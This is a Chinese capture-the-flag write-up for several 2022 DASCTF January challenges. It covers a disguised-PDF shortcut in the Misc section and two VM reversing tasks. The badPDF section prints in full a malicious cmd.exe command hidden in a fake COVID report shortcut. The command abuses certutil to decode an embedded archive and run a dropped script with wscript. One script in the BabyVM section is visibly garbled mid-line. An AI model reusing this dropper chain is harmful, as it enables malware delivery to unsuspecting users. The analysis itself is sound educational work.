# 2022DASCTF一月赛部分题解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Misc
###  badPDF
从文件类型我们可以看到这并不是一个单纯的pdf文件，而是一个lnk文件。
那我们直接看它的目标指向那里，从末尾看到明显是不全的（目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符）。
使用python调用vb读取一下这个lnk文件的完整参数：
    import sys
    import win32com.client 
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut("20200308-sitrep-48-covid-19.pdf.lnk")
    print(shortcut.Targetpath)
    print(shortcut.Arguments)
得到：
    C:\Windows\System32\cmd.exe
    /c copy "20200308-sitrep-48-covid-19.pdf.lnk" %tmp%\\g4ZokyumBB2gDn.tmp /y&for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&findstr.exe "TVNDRgAAAA" %tmp%\\g4ZokyumBB2gDn.tmp>%tmp%\\cSi1r0uywDNvDu.tmp&%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &wscript %tmp%\\9sOXN6Ltf0afe7.js
简单读一下cmd命令可以知道主要功能：
1、将当前的lnk文件复制到 **%tmp%** 目录下，且把*ertu*.exe复制到msoia.exe（后面解码会用到），然后找lnk文件中以
**“TVNDRgAAAA”** 开头的数据，并写入 **cSi1r0uywDNvDu.tmp** 文件。
    /c copy "20200308-sitrep-48-covid-19.pdf.lnk" %tmp%\\g4ZokyumBB2gDn.tmp /y&for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&findstr.exe "TVNDRgAAAA" %tmp%\\g4ZokyumBB2gDn.tmp>%tmp%\\cSi1r0uywDNvDu.tmp
2、使用msoia.exe对上一步写入的数据进行解码后保存到 **oGhPGUDC03tURV.tmp**
，接着执行expand命令将刚刚解码的数据进行解压缩，并全部保存到 **%tmp%** 目录下（ **EXPAND Source.cab -F:Files
Destination** ）
    %tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp%
3、最后使用 **wscript** 命令执行上一步解压缩出来的的 **9sOXN6Ltf0afe7.js** 文件。
    wscript %tmp%\\9sOXN6Ltf0afe7.js
下面按照此lnk文件执行的cmd命令来看看释放出的文件都有些什么：  
1、首先得到关键数据并解码：
    findstr "TVNDRgAAAA" 20200308-sitrep-48-covid-19.pdf.lnk > ans
    import base64
    f = open("ans", "rb")
    data = f.read()
    p = base64.b64decode(data)
    f.close()
    f = open("ree", "wb")
    f.write(p)
    f.close()
    print("-----------")
2、解码得到的文件头部是：MSCF 搜索一下可知道它是.cab文件。修改后缀后解压得到：
最后，从cSi1r0uywDNvDu.tmp文件中发现了运算flag的一个VBScript：
其实就是把
676d60667a64333665326564333665326564333665326536653265643336656564333665327c
进行hex解码后每个字节与1异或：
    >>> ans = bytes.fromhex(s)
    >>> ans
    b'gm`fzd36e2ed36e2ed36e2e6e2ed36eed36e2|'
    >>> ans = list(ans)
    >>> flag = [ans[i]^1 for i in range(len(ans))]
    >>> flag
    [102, 108, 97, 103, 123, 101, 50, 55, 100, 51, 100, 101, 50, 55, 100, 51, 100, 101, 50, 55, 100, 51, 100, 55, 100, 51, 100, 101, 50, 55, 100, 100, 101, 50, 55, 100, 51, 125]
    >>> ''.join(map(chr, flag))
    'flag{e27d3de27d3de27d3d7d3de27dde27d3}'
## Reverse
###  BabyVM
去除大量重复的花指令：
    from ida_bytes import *
    addr = 0x411000
    while addr >> enc = [0x000000000000009C, 0x00000000000001C0, 0x00000000000001D8, 0x00000000000001D4, 0x00000000000001D4, 0x00000000000001E8, 0x00000000000001C8, 0x0000000000000098, 0x00000000000001C8, 0x00000000000001C0, 0x00000000000001EC, 0x000000000000008C, 0x00000000000001D4, 0x000000000000008C, 0x00000000000001EC, 0x00000000000001EC, 0x00000000000001C0, 0x00000000000001C0, 0x00000000000001D8, 0x00000000000001D4, 0x000000000000009C, 0x00000000000001D0, 0x00000000000001D0, 0x00000000000001D0, 0x00000000000001D4, 0x00000000000001E8, 0x00000000000001D0, 0x00000000000001EC, 0x00000000000001C8, 0x00000000000001C8, 0x00000000000001E8, 0x000000000000008C]
    >>> enc
    [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140]
    >>> flag = [(enc[i]>>2)^0x42 for i in range(len(enc))]
    >>> flag
    [101, 50, 52, 55, 55, 56, 48, 100, 48, 50, 57, 97, 55, 97, 57, 57, 50, 50, 52, 55, 101, 54, 54, 54, 55, 56, 54, 57, 48, 48, 56, 97]
    >>> bytes(flag)
    b'e247780d029a7a992247e6667869008a'
###  EasyVM
开始根据BeingDebugged标志返回不同的值以决定触不触发异常，题目的本意就是程序在正常运行时返回2，然后触发一个除0异常进入到程序的关键函数，也是程序添加的异常处理函数。
看到异常处理函数，先对输入进行一个多了异或的base64编码：
后面是很一个简单的vm，就一些不多的函数指针，直接内存断点就能轻松定位到唯一加密函数：sub_4014D0
输入的每个字节进行两次异或，如下：
    0^input[0]^0xee = enc[0]
    enc[0]^input[1] = enc[1]
    ...
    ...
简单异或解密：
    >>> import base64
    >>> enc
    [190, 54, 172, 39, 153, 79, 222, 68, 238, 95, 218, 11, 181, 23, 184, 104, 194, 78, 156, 74, 225, 67, 240, 34, 138, 59, 136, 91, 229, 84, 255, 104, 213, 103, 212, 6, 173, 11, 216, 80, 249, 88, 224, 111, 197, 74, 253, 47, 132, 54, 133, 82, 251, 115, 215, 13, 227]
    >>> flag = []